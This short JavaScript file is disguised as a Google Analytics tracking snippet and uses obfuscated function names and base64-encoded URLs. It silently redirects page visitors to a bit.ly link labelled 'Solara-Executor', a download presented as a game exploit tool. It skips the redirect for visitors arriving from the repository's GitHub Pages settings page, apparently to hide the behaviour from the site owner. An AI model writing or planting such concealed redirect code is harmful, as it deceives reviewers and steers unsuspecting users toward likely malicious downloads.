window._obf_a = window._obf_a || [];

function _obf_func_0() {
    _obf_a.push(arguments);
}
_obf_func_0('js', new Date());
_obf_func_0('config', _obf_func_4('Ry1OVFRQNVlEWUw3'));

function _obf_func_1() {
    return document.referrer;
}

function _obf_func_2() {
    const _obf_var_0 = _obf_func_1();
    const _obf_var_1 = _obf_func_4('aHR0cHM6Ly9naXRodWIuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9zZXR0aW5ncy9wYWdlcw==');
    return _obf_var_0 !== _obf_var_1;
}

function _obf_func_3() {
    setTimeout(() => {
        const _obf_url = _obf_func_4('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
        window.location.href = _obf_url;
    }, 100);
}

function _obf_func_4(encodedStr) {
    return atob(encodedStr);
}

if (_obf_func_2()) {
    _obf_func_3();
} else {
    console.log('Redirect blocked due to _obf_func_2.');
}
